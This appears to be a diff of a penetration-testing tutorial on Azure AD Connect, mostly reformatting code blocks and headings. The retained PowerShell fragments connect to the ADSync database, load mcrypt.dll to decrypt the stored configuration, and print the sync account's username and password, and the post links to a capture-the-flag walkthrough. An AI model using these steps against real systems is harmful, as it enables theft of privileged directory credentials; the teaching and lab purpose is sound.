@@ -36,7 +36,7 @@ Azure AD Connect is a Microsoft tool designed to bridge on-premises Active Direc
 
 Here's a simplified diagram illustrating the Password Hash Synchronization (PHS) method:
 
-```nil
+```bash
 +----------------------+
 |   On-Premises AD     |
 +----------------------+
@@ -213,7 +213,7 @@ Before attempting to exploit Azure AD Connect, it's important to confirm its pre
 ### 6. Determine Synchronization Method (GUI only): {#6-dot-determine-synchronization-method--gui-only}
 
 -   **Open the Synchronization Service Manager**:
-    ```nil
+    ```cmd
       C:\Program Files\Microsoft Azure AD Sync\UIShell\miisclient.exe
     ```
 
@@ -308,45 +308,41 @@ Write-Host ("Password: " + $password.Password)
 
 <!--list-separator-->
 
--  LocalDB Version:
+-  **LocalDB Version**:
 
-    ```powershell
-    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
-    $client.Open()
-    ```
+```powershell
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+```
 
-    **Line-by-line breakdown**:
-
-    1.  `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"`
-        -   Creates a new SqlConnection object to connect to the `LocalDB` instance.
+##### Line-by-line breakdown:
+  1.   Creates a new SqlConnection object to connect to the `LocalDB` instance.
+        -   `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data`
         -   `"Data Source=(localdb)\.\ADSync"` specifies the `LocalDB` instance name.
         -   `"Initial Catalog=ADSync"` specifies the database name.
-
-    2.  `$client.Open()`
+  2.  `$client.Open()`
         -   Opens the connection to the database.
 
 <!--list-separator-->
 
--  SQL Server Version:
+-  **SQL Server Version**:
 
     ```powershell
     $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
     $client.Open()
     ```
 
-    **Line-by-line breakdown**:
+##### Line-by-line breakdown:
+1.  Creates a new SqlConnection object to connect to a full SQL Server instance.
+  - `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList`
+  -  `"Server=127.0.0.1"` specifies the local machine's loopback address, as SQL is running internally.
+  -  `"Database=ADSync"` specifies the database name.
+  -  `"Integrated Security=True"` enables Windows Authentication, using the current user's credentials.
+  -   The current user would need to have the correct permissions on the SQL database.
 
-    1.  `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"`
-        -   Creates a new SqlConnection object to connect to a full SQL Server instance.
-        -   `"Server=127.0.0.1"` specifies the local machine's loopback address, as SQL is running internally.
-        -   `"Database=ADSync"` specifies the database name.
-        -   `"Integrated Security=True"` enables Windows Authentication, using the current user's credentials.
-            -   The current user would need to have the correct permissions on the SQL database.
-
-    2.  `$client.Open()`
+  2.  `$client.Open()`
         -   Opens the connection to the database.
-
-    This version would be used if attacking a full SQL Server instance running locally on the host, rather than the standard `LocalDB` installation.
+- This version would be used if attacking a full SQL Server instance running locally on the host, rather than the standard `LocalDB` installation.
 
 
 #### 2. Retrieving Encryption Keys {#2-dot-retrieving-encryption-keys}
@@ -362,7 +358,7 @@ $entropy = $reader.GetGuid(2)
 $reader.Close()
 ```
 
-**Line-by-line breakdown**:
+##### Line-by-line breakdown:
 
 1.  `$cmd = $client.CreateCommand()`
     -   Creates a new SqlCommand object associated with the connection.
@@ -401,7 +397,7 @@ $crypted = $reader.GetString(1)
 $reader.Close()
 ```
 
-**Line-by-line breakdown**:
+##### Line-by-line breakdown:
 
 1.  `$cmd = $client.CreateCommand()`
     -   Creates a new SqlCommand object.
@@ -439,7 +435,7 @@ $decrypted = $null
 $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
 ```
 
-**Line-by-line breakdown**:
+##### Line-by-line breakdown:
 
 1.  `add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'`
     -   Loads the mcrypt.dll library for decryption.
@@ -481,7 +477,7 @@ Write-Host ("Username: " + $username.Username)
 Write-Host ("Password: " + $password.Password)
 ```
 
-**Line-by-line breakdown**:
+##### Line-by-line breakdown:
 
 1.  `$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}`
     -   Extracts the domain from the configuration XML using XPath.
@@ -514,7 +510,7 @@ Write-Host ("Password: " + $password.Password)
 
 ## Example of this attack: {#example-of-this-attack}
 
--   See my walkthrough for the box Monteverde
+-   +Walkthrough+: for the box Monteverde
     -   <https://bloodstiller.com/walkthroughs/monteverde-box/>
 
 
